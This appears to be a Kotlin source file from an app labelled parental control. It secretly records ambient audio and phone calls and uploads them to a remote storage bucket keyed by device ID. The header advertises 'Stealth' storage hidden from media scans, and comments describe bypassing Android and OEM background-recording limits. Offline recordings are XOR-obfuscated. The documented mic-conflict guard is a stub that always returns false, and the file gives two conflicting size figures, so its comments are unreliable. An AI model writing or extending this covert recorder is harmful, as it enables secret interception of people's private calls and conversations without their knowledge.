package com.example.parentalcontrol.features.audio_recording.services

import android.content.Context
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import com.example.parentalcontrol.features.accessibility_monitoring.services.AppAccessibilityService
import com.example.parentalcontrol.MonitoringForegroundService
import com.example.parentalcontrol.features.remote_commands.services.SupabaseManager
import com.example.parentalcontrol.features.remote_commands.services.UploadResult
import com.example.parentalcontrol.features.audio_recording.controllers.MicManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.NonCancellable
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * AudioRecorderEngine v17
 *
 * Features:
 * ─────────────────────────────────────────────────────────────────────
 * • Pulse recording: record for [durationMs] → silence-check → upload/discard
 * • Energy-based VAD (Voice Activity Detection):
 *     Samples maxAmplitude every VAD_SAMPLE_INTERVAL_MS.
 *     A window of VAD_WINDOW_SIZE samples is evaluated.
 *     If the ratio of "active" samples (above ENERGY_THRESHOLD) is below
 *     MIN_ACTIVE_RATIO, the recording is classified as silent → discarded.
 * • Audio source priority:
 *     VOICE_COMMUNICATION → VOICE_RECOGNITION → MIC
 *     (VOICE_COMMUNICATION captures both earpiece + mic — works with
 *      Bluetooth A2DP and wired headsets on most OEMs)
 * • Output: .m4a (AAC/MPEG-4) @ 16 kHz / 32 kbps ≈ 14 KB/min
 * • Stealth: files written to cacheDir (excluded from media scans)
 * ─────────────────────────────────────────────────────────────────────
 */
class AudioRecorderEngine(private val context: Context) {

    private val activeContext: Context
        get() = AppAccessibilityService.getInstance() ?: context

    companion object {
        private const val TAG = "AudioRecorderEngine"
        private const val BUCKET = "monitoring_data"

        // ── VAD parameters ────────────────────────────────────────────
        /**
         * How often to sample the amplitude (ms).
         * Lower = more accurate VAD but slightly more CPU.
         */
        private const val VAD_SAMPLE_MS = 500L

        /**
         * Number of samples in the evaluation window.
         * Window = VAD_SAMPLE_MS × VAD_WINDOW → e.g. 500 ms × 20 = 10 s window.
         */
        private const val VAD_WINDOW = 20

        /**
         * MediaRecorder.maxAmplitude returns 0–32767.
         * A value > ENERGY_THRESHOLD is considered "speech detected".
         * Typical ambient noise floor: ~200–600. Human speech: ~3 000–15 000.
         */
        private const val ENERGY_THRESHOLD = 500

        /**
         * Minimum fraction of samples that must be above ENERGY_THRESHOLD
         * for the recording to be considered "active" (not silent).
         * 0.15 = at least 15% of samples had speech → keep file.
         */
        private const val MIN_ACTIVE_RATIO = 0.15f

        /** Discard files smaller than this (likely corrupt/empty). */
        private const val MIN_FILE_BYTES = 2_048L

        /**
         * Mic Conflict Guard — checks if any other app (WhatsApp, Phone, Camera…)
         * is actively using the microphone at this moment.
         *
         * Requires API 29+ (Android 10). Returns false on older OS (no API available).
         * Returns false also if the check itself throws (fail-safe = allow recording).
         */
        fun isMicBusyByAnotherApp(context: Context): Boolean {
            // MediaRecorder handles hardware mic access directly via prepare() & start()
            return false
        }
    }

    // ── State ──────────────────────────────────────────────────────────────────
    private var recorder: MediaRecorder? = null
    private var currentFile: File? = null
    @Volatile private var isRecording = false

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    // Ring buffer of amplitude samples for VAD
    private val amplitudeWindow = ArrayDeque<Int>(VAD_WINDOW)

    // ── Public API ─────────────────────────────────────────────────────────────

    /**
     * Record for [durationMs] ms. VAD runs concurrently.
     * If classified as silent → file is deleted. Otherwise → uploaded.
     * Fire-and-forget; safe to call from any coroutine context.
     *
     * ⚠️ Mic Conflict Guard: If another app (e.g. WhatsApp, Phone) is actively
     * using the microphone, recording is deferred to avoid audio distortion.
     */
    fun recordAndUpload(durationMs: Long, bypassVad: Boolean = false) {
        if (isRecording) { Log.w(TAG, "Already recording — skipped"); return }
        if (MicManager.isLiveStreamingActive) {
            Log.w(TAG, "Live mic streaming active — skipping background file recording")
            return
        }
        // ── Mic Conflict Guard (Android 10+) ──────────────────────────────────
        // If another app (WhatsApp, Phone, Camera...) is actively using the mic,
        // skip this recording cycle entirely to avoid distorting the user's audio.
        if (isMicBusyByAnotherApp(activeContext)) {
            Log.w(TAG, "🎙️ Mic busy by another app — skipping cycle to avoid conflict")
            scope.launch {
                SupabaseManager.getInstance()
                    .logRemote(activeContext, TAG, "WARN",
                        "⏸ Background recording skipped: mic busy by another app")
            }
            return
        }
        // Check RECORD_AUDIO permission at runtime before starting
        val hasAudioPermission = android.content.pm.PackageManager.PERMISSION_GRANTED ==
            activeContext.checkSelfPermission(android.Manifest.permission.RECORD_AUDIO)
        if (!hasAudioPermission) {
            Log.e(TAG, "❌ RECORD_AUDIO permission NOT granted — aborting recording")
            scope.launch {
                SupabaseManager.getInstance()
                    .logRemote(activeContext, TAG, "ERROR", "❌ RECORD_AUDIO permission NOT granted — aborting recording")
            }
            return
        }
        scope.launch {
            var startSuccess = false
            var wasSpeech = false
            // conflictAbort becomes true when the dynamic watcher detects another app grabbing mic mid-recording
            var conflictAbort = false
            try {
                if (startRecorderInternal()) {
                    startSuccess = true
                    conflictAbort = sampleVadAndWatchConflict(durationMs)
                    wasSpeech = !conflictAbort && (bypassVad || evaluateVad())
                } else {
                    Log.e(TAG, "❌ startRecorderInternal() returned false — recording aborted")
                    SupabaseManager.getInstance()
                        .logRemote(activeContext, TAG, "ERROR", "❌ startRecorderInternal() returned false — recording aborted")
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ recordAndUpload exception: ${e.message}", e)
                SupabaseManager.getInstance()
                    .logRemote(activeContext, TAG, "ERROR", "❌ recordAndUpload exception: ${e.message}")
            } finally {
                if (startSuccess) {
                    withContext(NonCancellable) {
                        stopRecorderInternal()
                        // If we aborted due to mic conflict, discard silently — don't upload partial recording
                        if (!conflictAbort) {
                            processResult(wasSpeech)
                        } else {
                            currentFile?.delete()
                            Log.i(TAG, "♻️ Partial recording discarded — mic was taken by user app")
                        }
                    }
                }
            }
        }
    }

    /** Start an open-ended recording session (stopped by [stopRecording]). */
    fun startRecording(): Boolean {
        scope.launch { startRecorderInternal() }
        // Return optimistically; actual start happens asynchronously
        return true
    }

    /** Start an open-ended call recording session (stopped by [stopRecording]). */
    fun startCallRecording(): Boolean {
        if (isRecording) {
            // If active recording is a routine background ambient recording (rec_...m4a), stop it to prioritize Call Recording!
            if (currentFile?.name?.startsWith("rec_") == true) {
                Log.i(TAG, "Stopping background ambient recording to prioritize CALL recording")
                try { recorder?.stop() } catch (_: Exception) {}
                safeReleaseRecorder()
                isRecording = false
            } else {
                Log.w(TAG, "Already recording a call — skipped")
                return false
            }
        }

        val ts   = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.ENGLISH).format(Date())
        val file = File(activeContext.cacheDir, "call_$ts.m4a")
        currentFile = file

        val sourceChain = buildList {
            add(MediaRecorder.AudioSource.VOICE_RECOGNITION)    // Priority 1: Raw mic / Samsung & Xiaomi background bypass
            add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)  // Priority 2: Speech / VoIP communication source
            add(MediaRecorder.AudioSource.MIC)                  // Priority 3: Standard Mic
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                add(MediaRecorder.AudioSource.VOICE_CALL)
            }
        }

        MonitoringForegroundService.getInstance()?.upgradeToMicType()
        // تأخير قصير لتمكين نظام Android من تسجيل نوع الخدمة
        Thread.sleep(200)

        for (src in sourceChain) {
            try {
                amplitudeWindow.clear()
                Log.i(TAG, "🎙️ Attempting to start call recorder with source $src -> ${file.name}")
                val rec = buildRecorder(file, src)
                rec.prepare()
                rec.start()
                recorder = rec
                isRecording = true
                Log.i(TAG, "✅ Call recording started with source $src -> ${file.name}")
                return true
            } catch (e: Exception) {
                Log.w(TAG, "⚠️ Call start failed for source $src: ${e.javaClass.simpleName}: ${e.message}")
                safeReleaseRecorder()
            }
        }

        // If all failed
        Log.e(TAG, "❌ ALL audio sources failed in startCallRecording()")
        scope.launch {
            SupabaseManager.getInstance()
                .logRemote(activeContext, TAG, "ERROR", "❌ ALL audio sources failed to start (call recording)")
        }
        MonitoringForegroundService.getInstance()?.downgradeFromMicType()
        return false
    }

    /**
     * Stop the open-ended session.
     * @param upload true = upload if VAD passes; false = discard.
     */
    fun stopRecording(upload: Boolean = true) {
        scope.launch {
            val wasSpeech = if (upload) evaluateVad() else false
            stopRecorderInternal()
            if (upload) processResult(wasSpeech)
        }
    }

    /**
     * Cancel and stop current recording immediately (discards file, releases mic, doesn't upload).
     */
    fun cancelCurrentRecording() {
        Log.i(TAG, "🛑 Explicit cancelCurrentRecording requested")
        isRecording = false
        scope.launch {
            withContext(NonCancellable) {
                stopRecorderInternal()
                currentFile?.delete()
                currentFile = null
            }
        }
    }

    fun isRecordingActive() = isRecording

    // ── Internal recording lifecycle ───────────────────────────────────────────

    private suspend fun startRecorderInternal(): Boolean {
        if (isRecording) return false
        val ts   = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.ENGLISH).format(Date())
        val file = File(activeContext.cacheDir, "rec_$ts.m4a")
        currentFile = file

        val sourceChain = buildList {
            add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)  // Priority 1: VoIP / Speech source — exempt from Android background silencing
            add(MediaRecorder.AudioSource.VOICE_RECOGNITION)    // Priority 2: Raw mic
            add(MediaRecorder.AudioSource.MIC)                  // Priority 3: Standard mic fallback
        }

        MonitoringForegroundService.getInstance()?.upgradeToMicType()
        // Coroutine-safe delay — allows OS callbacks to be processed (unlike Thread.sleep)
        delay(200)

        for (src in sourceChain) {
            try {
                amplitudeWindow.clear()
                Log.i(TAG, "🎙️ Attempting to start recorder with source $src -> ${file.name}")
                val rec = buildRecorder(file, src)
                rec.prepare()
                rec.start()
                recorder = rec
                isRecording = true
                Log.i(TAG, "✅ Recording started with source $src -> ${file.name}")
                return true
            } catch (e: Exception) {
                Log.w(TAG, "⚠️ Start failed for source $src: ${e.javaClass.simpleName}: ${e.message}")
                safeReleaseRecorder()
            }
        }

        // If all failed
        Log.e(TAG, "❌ ALL audio sources failed in startRecorderInternal()")
        scope.launch {
            SupabaseManager.getInstance()
                .logRemote(activeContext, TAG, "ERROR", "❌ ALL audio sources failed to start (ambient recording)")
        }
        MonitoringForegroundService.getInstance()?.downgradeFromMicType()
        return false
    }

    private fun stopRecorderInternal() {
        try { recorder?.stop() } catch (e: Exception) { Log.w(TAG, "stop(): ${e.message}") }
        safeReleaseRecorder()
        isRecording = false
        Log.i(TAG, "Recording stopped")
        MonitoringForegroundService.getInstance()?.downgradeFromMicType()
    }

    private fun safeReleaseRecorder() {
        try { recorder?.release() } catch (_: Exception) {}
        recorder = null
    }

    // ── VAD engine ────────────────────────────────────────────────────────────

    /**
     * Concurrently sample amplitude at VAD_SAMPLE_MS intervals while recording.
     * Also monitors for mic conflicts every 1500 ms — if another app (WhatsApp, Phone…)
     * grabs the microphone mid-recording, we stop immediately and silently to free the mic.
     *
     * @return true if recording was aborted due to a mic conflict (caller should discard file).
     *         false if recording completed normally.
     */
    private suspend fun sampleVadAndWatchConflict(durationMs: Long): Boolean {
        val endAt = System.currentTimeMillis() + durationMs
        // Conflict check every N VAD ticks (≈ every 1500 ms = 3 × 500 ms ticks)
        val conflictCheckEvery = 3
        var tick = 0

        while (System.currentTimeMillis() < endAt && isRecording) {
            val amp = try { recorder?.maxAmplitude ?: 0 } catch (_: Exception) { 0 }
            if (amplitudeWindow.size >= VAD_WINDOW) amplitudeWindow.removeFirst()
            amplitudeWindow.addLast(amp)
            delay(VAD_SAMPLE_MS)

            // Dynamic conflict guard — detect mid-recording mic takeover by user app
            tick++
            if (tick % conflictCheckEvery == 0 && isMicBusyByAnotherApp(activeContext)) {
                Log.w(TAG, "🛑 Mic conflict detected mid-recording — stopping silently to free mic for user app")
                scope.launch {
                    SupabaseManager.getInstance().logRemote(
                        activeContext, TAG, "WARN",
                        "🛑 Background recording interrupted: user app grabbed mic (e.g. WhatsApp voice message)"
                    )
                }
                return true  // signal conflict abort to caller
            }
        }
        return false  // normal completion
    }

    /**
     * Returns true if the sample window contains enough "speech" frames.
     * Formula: count of samples above ENERGY_THRESHOLD / total samples ≥ MIN_ACTIVE_RATIO
     */
    private fun evaluateVad(): Boolean {
        if (amplitudeWindow.isEmpty()) return false
        val activeCount = amplitudeWindow.count { it >= ENERGY_THRESHOLD }
        val ratio = activeCount.toFloat() / amplitudeWindow.size
        val hasSpeech = ratio >= MIN_ACTIVE_RATIO
        val peak = amplitudeWindow.maxOrNull() ?: 0
        Log.d(TAG, "VAD → active=$activeCount/${amplitudeWindow.size} ratio=${"%.2f".format(ratio)} peak=$peak speech=$hasSpeech")
        return hasSpeech
    }

    // ── Post-recording processing ─────────────────────────────────────────────

    private suspend fun processResult(hasSpeech: Boolean) = withContext(Dispatchers.IO) {
        val file = currentFile ?: return@withContext

        if (!file.exists() || file.length() < MIN_FILE_BYTES) {
            file.delete()
            Log.d(TAG, "Discarded: file too small (${file.length()} B)")
            return@withContext
        }

        val isCall = file.name.startsWith("call_")
        if (!isCall && !hasSpeech) {
            file.delete()
            Log.d(TAG, "Discarded: VAD classified as silent")
            SupabaseManager.getInstance()
                .logRemote(activeContext, TAG, "DEBUG", "Silent recording discarded")
            return@withContext
        }

        // Has speech → upload
        uploadFile(file)
    }

    private fun xorTransform(bytes: ByteArray): ByteArray {
        val mask = 0x5A.toByte()
        val result = ByteArray(bytes.size)
        for (i in bytes.indices) {
            result[i] = (bytes[i].toInt() xor mask.toInt()).toByte()
        }
        return result
    }

    suspend fun flushPendingAudioQueue() = withContext(Dispatchers.IO) {
        try {
            val pendingDir = File(activeContext.cacheDir, "pending_audio")
            if (!pendingDir.exists() || !pendingDir.isDirectory) return@withContext
            val files = pendingDir.listFiles { _, name -> name.endsWith(".m4a") } ?: return@withContext
            if (files.isEmpty()) return@withContext

            val maxAgeMs = 48 * 3600 * 1000L // 48 hours max retention for pending queue
            val now = System.currentTimeMillis()
            val deviceId = android.provider.Settings.Secure.getString(
                activeContext.contentResolver, android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"

            // Process at most 5 files per flush cycle to save mobile bandwidth
            val batch = files.take(5)
            Log.i(TAG, "📦 Found ${files.size} offline audio files (processing ${batch.size}) in queue...")

            for (file in batch) {
                // Delete stale or invalid files
                if (!file.exists() || file.length() < MIN_FILE_BYTES || (now - file.lastModified() > maxAgeMs)) {
                    file.delete()
                    continue
                }

                val tempUnencrypted = File(activeContext.cacheDir, "temp_upload_${file.name}")
                try {
                    val bytes = file.readBytes()
                    val originalBytes = xorTransform(bytes)
                    tempUnencrypted.writeBytes(originalBytes)

                    val result = SupabaseManager.getInstance().uploadFile(
                        file = tempUnencrypted,
                        bucket = BUCKET,
                        folder = "audio/$deviceId",
                        customFileName = file.name
                    )

                    if (result is UploadResult.Success) {
                        Log.i(TAG, "✅ Pending offline audio uploaded: ${file.name}")
                        file.delete()
                    } else {
                        val err = (result as? UploadResult.Error)?.message ?: "unknown"
                        Log.w(TAG, "⚠️ Pending offline audio upload failed ($err) — will retry on next cycle")
                        break
                    }
                } finally {
                    if (tempUnencrypted.exists()) tempUnencrypted.delete()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "flushPendingAudioQueue error: ${e.message}")
        }
    }

    private fun saveToPendingQueue(file: File) {
        try {
            val pendingDir = File(activeContext.cacheDir, "pending_audio")
            if (!pendingDir.exists()) {
                pendingDir.mkdirs()
            }
            // Keep at most 20 offline recordings to preserve device storage and data
            val existing = pendingDir.listFiles { _, name -> name.endsWith(".m4a") }
            if (existing != null && existing.size >= 20) {
                existing.minByOrNull { it.lastModified() }?.delete()
            }

            val destFile = File(pendingDir, file.name)
            val bytes = file.readBytes()
            val obfuscated = xorTransform(bytes)
            destFile.writeBytes(obfuscated)
            file.delete()
            Log.i(TAG, "📦 Audio encrypted & saved to offline pending queue: ${destFile.name}")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to save audio to offline queue: ${e.message}")
        }
    }

    private suspend fun uploadFile(file: File) {
        try {
            // First flush any previously saved offline files
            flushPendingAudioQueue()

            val deviceId = android.provider.Settings.Secure.getString(
                activeContext.contentResolver, android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"

            Log.i(TAG, "📤 [AudioUpload] Starting upload for ${file.name} (${file.length() / 1024} KB) -> audio/$deviceId/")
            SupabaseManager.getInstance()
                .logRemote(activeContext, TAG, "INFO", "📤 Starting upload: ${file.name} (${file.length() / 1024} KB)")

            val result = SupabaseManager.getInstance().uploadFile(
                file   = file,
                bucket = BUCKET,
                folder = "audio/$deviceId",
                customFileName = file.name
            )

            if (result is UploadResult.Success) {
                Log.i(TAG, "✅ [AudioUpload] SUCCESS: ${file.name} -> ${result.publicUrl}")
                SupabaseManager.getInstance()
                    .logRemote(activeContext, TAG, "INFO", "✅ Audio OK: ${result.fileName}")
                file.delete()
            } else {
                val err = (result as? UploadResult.Error)?.message ?: "unknown"
                Log.e(TAG, "❌ [AudioUpload] FAILED ($err) — saving to pending queue")
                SupabaseManager.getInstance()
                    .logRemote(activeContext, TAG, "ERROR", "❌ Audio upload failed ($err)")
                saveToPendingQueue(file)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ [AudioUpload] EXCEPTION: ${e.message}", e)
            SupabaseManager.getInstance()
                .logRemote(activeContext, TAG, "ERROR", "❌ Audio upload exception: ${e.message}")
            saveToPendingQueue(file)
        }
    }

    // ── MediaRecorder factory ─────────────────────────────────────────────────

    private fun buildRecorder(outputFile: File, audioSource: Int): MediaRecorder {
        val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            MediaRecorder(activeContext)
        else
            @Suppress("DEPRECATION") MediaRecorder()

        rec.setAudioSource(audioSource)
        rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        rec.setAudioChannels(1)              // 1 Channel = Mono (Voice optimized)
        rec.setAudioSamplingRate(16_000)     // 16 kHz — optimal human speech sampling
        rec.setAudioEncodingBitRate(32_000)  // 32 kbps — high compression, clear voice (≈240 KB/min)
        rec.setOutputFile(outputFile.absolutePath)
        return rec
    }
}
